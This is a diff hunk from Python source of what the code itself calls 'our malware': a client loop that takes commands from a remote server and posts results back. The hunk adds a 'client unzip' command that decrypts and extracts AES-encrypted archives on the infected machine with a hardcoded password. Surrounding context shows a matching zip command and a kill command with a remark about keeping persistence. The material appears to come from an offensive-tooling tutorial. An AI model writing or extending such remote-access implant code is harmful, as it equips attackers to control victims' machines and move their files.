@@ -155,6 +155,30 @@ while True:
             post_to_server("You must enter the filepath to zip.")
         except (FileNotFoundError, PermissionError, OSError):
             post_to_server(f"Unable to access {filepath} on client.\n")
+
+    # The "client unzip FILENAME" command allows us to unzip/decrypt files on the client
+    elif command.startswith("client unzip"):
+
+        # Split out the filepath to unzip and replace \ with /
+        filepath = get_third_item(command)
+
+        # If we had an Index Error, start a new interation of the while loop
+        if filepath is None:
+            continue
+
+        # Return the basename of filepath
+        filename = path.basename(filepath)
+
+        # Unzip/decrypt file using AES encryption and LZMA compression method
+        try:
+            with AESZipFile(filepath) as zip_file:
+                zip_file.setpassword(ZIP_PASSWORD)
+                zip_file.extractall(path.dirname(filepath))
+                post_to_server(f"{filepath} is now unzipped and decrypted on the {client}.\n")
+        except IndexError:
+            post_to_server("You must enter the filepath to unzip.")
+        except (FileNotFoundError, PermissionError, OSError):
+            post_to_server(f"Unable to access {filepath} on client.\n")
                     
     # The "client kill" command will shut down our malware; make sure we have persistence!
     elif command.startswith("client kill"):
